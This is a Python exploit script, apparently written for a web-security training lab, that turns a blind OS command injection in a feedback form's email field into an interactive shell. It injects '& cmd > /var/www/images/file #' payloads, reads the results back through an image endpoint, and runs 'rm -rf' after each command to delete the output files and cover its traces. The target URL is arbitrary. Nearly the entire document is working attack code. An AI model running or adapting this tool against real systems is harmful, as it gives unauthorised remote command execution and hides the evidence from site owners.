#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import string
import random
from datetime import timedelta
from timeit import default_timer as timer
import argparse  # cli interface
import logging
import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

__appName__ = 'OS Command Injection LAB#3'
__version__ = '1.0.0'
__appVers__ = '%s v%s' % (__appName__, __version__)
__usage__ = ('Perform OS Command Injection in Web Academy LAB #3')

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def rndString(length):
    # Generate a random string
    str = string.ascii_letters
    return ''.join(random.choice(str) for i in range(length))


def testURL(s, url):
    try:
        r = s.get(url, verify=False)
    except:
        return False
    logging.debug(f'Test URL status code: {r.status_code}')
    if r.status_code == 200:
        return True
    else:
        return False


def get_csrf_token(s, url):
    feedback_path = '/feedback'
    r = s.get(url + feedback_path, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find(attrs={'name': 'csrf'})['value']
    logging.debug(f'Found CSRF token: {csrf}')
    return csrf


def exploit_command_injection(s, url, payload, output_file, cleanup):
    submit_feedback_path = '/feedback/submit'
    command_injection = 'test@test.com ' + payload
    logging.debug('Test URL')
    # Test if URL is accessible
    if not testURL(s, url):
        return 'Error: URL expired or not valid, use [url] command to set a new target'
    logging.debug('Fetching CSRF Token')
    csrf_token = get_csrf_token(s, url)
    data = {'csrf': csrf_token, 'name': 'test', 'email': command_injection, 'subject': 'test', 'message': 'test'}
    logging.debug(f'Injecting command: {data}')
    res = s.post(url + submit_feedback_path, data=data, verify=False, proxies=proxies)

    if not cleanup:
        # Read the command result from the output file created
        output_path = f'/image?filename={output_file}'
        res2 = s.get(url + output_path, verify=False, proxies=proxies)

        match res2.status_code:
            case 200:
                logging.debug('Exploit successful')
                return res2.text
            case _:
                logging.debug('Exploit failed, output file not found')
                return 'Error: Cannot exploit this URL, check parameters and try again'
    else:
        return 'Cleanup done!'


def main():
    # START CLI UI
    parser = argparse.ArgumentParser(description=__usage__)
    parser.add_argument('-v', '--version', action='version', version=__appVers__)
    parser.add_argument('-u', type=str, help='Target URL', required=True, metavar='URL')
    parser.add_argument('-d', '--debug', help='enable logging debug', default=False, action="store_true")
    args = parser.parse_args()
    # END CLI UI
    # Logging to STDOUT
    logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
    if not args.debug:
        logging.disable(logging.DEBUG)
    logging.info('Session Started')

    url = args.u.strip(' /')

    banner = '''####################################
#        Interactive Shell         #
####################################'''

    print(banner)
    print(f'URL: {url}')
    print(f'Type "help" for options\n')

    # Interactive loop
    while True:
        cmd = input('<CMD> ').strip()
        match cmd.split():
            case ['help']:
                # Help Menu
                print('       url <target>    - Change target URL, eg. "url https://newtarget.com"')
                print('       exit or quit    - Quit the application')
            case ['url', new_url]:
                # Change target URL
                url = new_url.strip(' /')
                print(f'Changed target URL: {url}')
                continue
            case ['exit' | 'quit']:
                # Exit / Quit the application
                print('<CMD> Bye!')
                break
            case _ if not cmd:
                # Ignore empty commands
                continue
            case _:
                # Capture any command
                logging.debug(f'[Command]: {cmd}')
                # Use random string for the output file name
                output_file = rndString(10) + '.txt'
                payload = f'& {cmd} > /var/www/images/{output_file} #'
                logging.debug(f'Payload: {payload}')
                # Create an HTTP session to the target URL
                s = requests.Session()
                output = exploit_command_injection(s, url, payload, output_file, cleanup=False)
                print(f'[Output]:\n{output}')
                # Cleanup trace by deleting the file from the server
                logging.debug(f'Cleanup trace, delete output file {output_file}')
                payload = f'& rm -rf /var/www/images/{output_file} #'
                cleanup = exploit_command_injection(s, url, payload, output_file, cleanup=True)
                logging.debug(cleanup)

    logging.info('Session Finished')
    end_time = timer()
    logging.info(f'Duration: {(timedelta(seconds=end_time-start_time))}')


if __name__ == '__main__':
    start_time = timer()
    main()
